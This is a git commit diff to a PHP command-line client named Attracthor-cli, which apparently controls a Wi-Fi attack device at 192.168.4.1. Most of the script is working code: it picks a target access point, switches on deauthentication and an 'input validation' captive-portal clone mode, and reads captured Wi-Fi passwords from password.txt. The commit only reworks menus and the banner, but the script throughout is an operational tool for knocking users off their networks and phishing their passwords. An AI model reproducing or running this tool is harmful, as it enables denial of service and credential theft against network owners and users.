6ba7549f3ede01d4cff077643d1d82a4ec821264
Febryan <67999065+peking707@users.noreply.github.com>
2021-07-29 18:36:00 +0700

    Update attracthor.php

--- attracthor.php
+++ attracthor.php
@@ -32,9 +32,15 @@ $ua = array(
 "Referer: http://192.168.4.1/login",
 "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
   );
-  $bar = "Attracthor-cli By Febryan\n\n";
+ $bar = "
+╭━━━┳━━━━┳━━━━╮╱╭━━━┳╮╱╱╭━━╮
+┃╭━╮┃╭╮╭╮┃╭╮╭╮┃╱┃╭━╮┃┃╱╱╰┫┣╯
+┃┃╱┃┣╯┃┃╰┻╯┃┃╰╯╱┃┃╱╰┫┃╱╱╱┃┃
+┃╰━╯┃╱┃┃╱╱╱┃┃╭━━┫┃╱╭┫┃╱╭╮┃┃
+┃╭━╮┃╱┃┃╱╱╱┃┃╰━━┫╰━╯┃╰━╯┣┫┣╮
+╰╯╱╰╯╱╰╯╱╱╱╰╯╱╱╱╰━━━┻━━━┻━━╯ By Febryan\n\n";
 print $bar;
-print "Please Login...\n[*] Password: ";
+print "Please Login...\n[>] Password: ";
 $pass = trim(fgets(STDIN));
 
 $data = "strWebUsername=razor&PASSWORD=$pass&SUBMIT=Submit";
@@ -43,30 +49,52 @@ $login = curl("http://192.168.4.1/login", $ua, $data);
 $beranda = explode('o_deauth', $login);
 $log = $beranda[1];
 if(isset($log)){
-print "Success Login\n";
+print "[*] SUCCESS LOGIN\n";
 sleep(5);
-wifi:
+menu:
 system('clear');
 print $bar;
-print "[#] Wifi List:\n";
+print "MENU:\n[1] SELECT TARGET\n[2] MODE SETTINGS\n[3] LIST PASSWORDS\n[4] REBOOT\n[5] START\n\n[>]Select: ";
+$menu = trim(fgets(STDIN));
+if($menu == 1){
+  goto select;
+}
+if($menu == 2){
+  goto option;
+}
+if($menu == 3){
+  goto pass;
+}
+if($menu == 4){
+$rebot = get('http://192.168.4.1/reboot');
+  goto menu;
+}
+if($menu ==  5){
+  print '["PLEASE TURN OFF YOU WIFI TO START MODE & BACK AGAIN"]';
+  sleep("15");
+  goto menu;
+}
+select:
+system("clear");
+print $bar;
+print "[*] BSSID&SSID List:\n";
 $survey = get('http://192.168.4.1/survey');
-  for($a=1; $a<5; $a++){
-
+  for($a=1; $a<7; $a++){
   $list = explode('?', $survey);
   $list = explode('>', $list[$a]);
-  print "$list[0]\n";
+  print "\n $list[0]";
 }
-print "[5]Refresh \n";
+  
+print "\n[5]BACK MENU \n";
 print "\n[>]Copy BSSID&SSID in here: ";
 $selet = trim(fgets(STDIN));
 if($selet == 5){
-  goto wifi;
+  goto menu;
 }
 $gas = get("http://192.168.4.1/settarget?$selet");
-print "Waiting...";
-sleep(2);
-system('clear');
-menu:
+goto menu;
+option:
+system("clear");
 $getmenu= get('http://192.168.4.1/setup');
 $targe = explode('/survey>', $getmenu);
 $targe = explode('</a>', $targe[1]);
@@ -81,41 +109,38 @@ $inputv = $getv[0];
 $target = $targe[0];
 $autor = $obot[0];
 print $bar;
-print "\nWifi Target[$target]\n\nAttack Mode\n[1]Deauth [$deauth]\n[2]Input Validation[$inputv]\n[3]Auto Reboot [$autor]\n\n[Enter To Attack]\n[>]Select: ";
-$menu = trim(fgets(STDIN));
-if($menu == 1){
+print "\nWifi Target: [$target]\nAttack Mode\n[1]Deauth [$deauth]\n[2]Input Validation[$inputv]\n[3]Auto Reboot [$autor]\n\n[4]BACK MENU\n[>]Select: ";
+$mode = trim(fgets(STDIN));
+if($mode == 1){
 $getdeauth = get('http://192.168.4.1/o_deauth');
   system('clear');
-  goto menu;
+  goto option;
 }
-if($menu == 2){
+if($mode == 2){
     $getinput= get('http://192.168.4.1/o_inputvalid');
      system('clear');
-     goto menu;
+     goto option;
 }
-if($menu == 3){
+if($mode == 3){
 $getautor = get('http://192.168.4.1/o_autoreboot');
   system('clear');
+  goto option;
+}
+if($mode == 4){
   goto menu;
 }
-system('clear');
-print $bar;
-print "[*] Turn off wifi attracthor from your device\n";
-sleep(4);
-print "[*] Waiting for the attracthor indicator lamp off\n";
-sleep(150);
-print "[*] Indicator Off? Connect Wifi Clone\n";
-sleep(5);
-print "[>] already? [Enter to Continue]\n";
-$indi = trim(fgets(STDIN));
+
 pass:
 system('clear');
 print $bar;
 $info = get('http://192.168.4.1/password.txt');
 print "Password:\n$info\n";
-sleep(2);
-goto pass;
+print "[5]BACK MENU\n\n[>]Select: ";
+$ps = trim(fgets(STDIN));
+if($ps == 5){
+  goto menu;
+}
 }else{
   print "Password Wrong\n";
-}
+} 
 ?>
